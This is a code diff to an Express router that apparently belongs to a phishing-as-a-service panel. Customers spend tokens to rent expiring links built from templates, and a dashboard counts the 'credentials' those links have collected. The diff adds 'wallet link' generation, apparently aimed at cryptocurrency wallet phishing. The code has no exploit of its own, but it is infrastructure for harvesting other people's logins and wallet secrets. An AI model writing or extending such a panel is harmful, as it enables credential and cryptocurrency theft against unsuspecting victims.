@@ -1,5 +1,5 @@
 const router = require("express").Router();
-const { linkTypes, templates } = require("../constants");
+const { linkTypes, templates, walletTypes } = require("../constants");
 const Links = require("../models/LinkModel");
 const Credentials = require("../models/CredentialModel");
 const { ensureAuthenticated } = require("../config/auth");
@@ -7,6 +7,7 @@ const ShortUniqueId = require("short-unique-id");
 const User = require("../models/User");
 const bcrypt = require("bcryptjs");
 const moment = require("moment");
+const WalletLink = require("../models/WalletLink");
 
 
 router.get("/", async (req, res) => {
@@ -22,10 +23,11 @@ router.get("/dashboard", ensureAuthenticated, async (req, res) => {
         const credentials = await Credentials.find({ user: req.user.id }).limit(10);
         const links = await Links.find({ user: req.user.id }).limit(10);
 
+        const walletlinkscount = await WalletLink.find({ user: req.user.id }).count();
         const linkscount = await Links.find({ user: req.user.id }).count();
         const credentialscount = await Credentials.find({ user: req.user.id }).count();
 
-        return res.render("dashboard", { req, credentials, moment, credentialscount, linkscount, links, layout: "layout2" });
+        return res.render("dashboard", { req, credentials, moment, walletlinkscount, credentialscount, linkscount, links, layout: "layout2" });
     } catch (err) {
         console.log(err)
     }
@@ -45,6 +47,11 @@ router.get("/credentials", ensureAuthenticated, async (req, res) => {
 router.get("/links", ensureAuthenticated, async (req, res) => {
     const links = await Links.find({ user: req.user.id });
     return res.render("Links", { links, moment, req, layout: "layout2" });
+});
+
+router.get("/wallet-links", ensureAuthenticated, async (req, res) => {
+    const links = await WalletLink.find({ user: req.user.id });
+    return res.render("walletLinks", { links, moment, req, layout: "layout2" });
 });
 
 router.get("/links/:id", ensureAuthenticated, async (req, res) => {
@@ -117,11 +124,76 @@ router.post("/create-link", ensureAuthenticated, async (req, res) => {
     }
 });
 
+router.get("/create-wallet-link", ensureAuthenticated, (req, res) => {
+    try {
+        return res.render("walletLink", { req, layout: "layout2" });
+    } catch (err) {
+        console.log(err);
+        return res.redirect("/notfound");
+    }
+});
+
+router.post("/create-wallet-link", ensureAuthenticated, async (req, res) => {
+    try {
+        const {
+            name,
+            linkType,
+            months
+        } = req.body;
+
+        if (!walletTypes.includes(linkType) || !months || !name) {
+            req.flash("error_msg", "Fill all fields correctly");
+            return res.redirect("/create-link");
+        }
+
+        const price = Math.abs(months) * 8;
+
+        if (req.user.tokens < price) {
+            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
+            return res.redirect("/create-link");
+        }
+
+        const uid = new ShortUniqueId({ length: 10 });
+        const uid2 = new ShortUniqueId({ length: 10 });
+        const uniqueID = uid2.rnd() + "-" + uid.rnd();
+
+        const currentDate = new Date();
+        const newDate = new Date(currentDate);
+        newDate.setDate(currentDate.getDate() + ((30) * months));
+
+        const newLink = new WalletLink({
+            linkType,
+            name: name.trim(),
+            shortID: uniqueID,
+            user: req.user.id,
+            expiry: newDate
+        });
+        await newLink.save();
+        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - price });
+        req.flash("success_msg", "Link generated successfully!");
+        return res.redirect(`/successful-wallet-link/${uniqueID}`);
+    } catch (err) {
+        console.log(err);
+        return res.redirect("/notfound");
+    }
+});
+
 router.get("/successful-link/:id", ensureAuthenticated, async (req, res) => {
     try {
         const id = req.params.id;
         const link = await Links.findOne({ link: id });
         return res.render("successfulLink", { req, id, moment, link, layout: "layout2" });
+    } catch (err) {
+        console.log(err);
+        return res.redirect("/notfound");
+    }
+});
+
+router.get("/successful-wallet-link/:id", ensureAuthenticated, async (req, res) => {
+    try {
+        const id = req.params.id;
+        const walletLink = await WalletLink.findOne({ shortID: id });
+        return res.render("successfulWalletLink", { req, id, moment, walletLink, layout: "layout2" });
     } catch (err) {
         console.log(err);
         return res.redirect("/notfound");
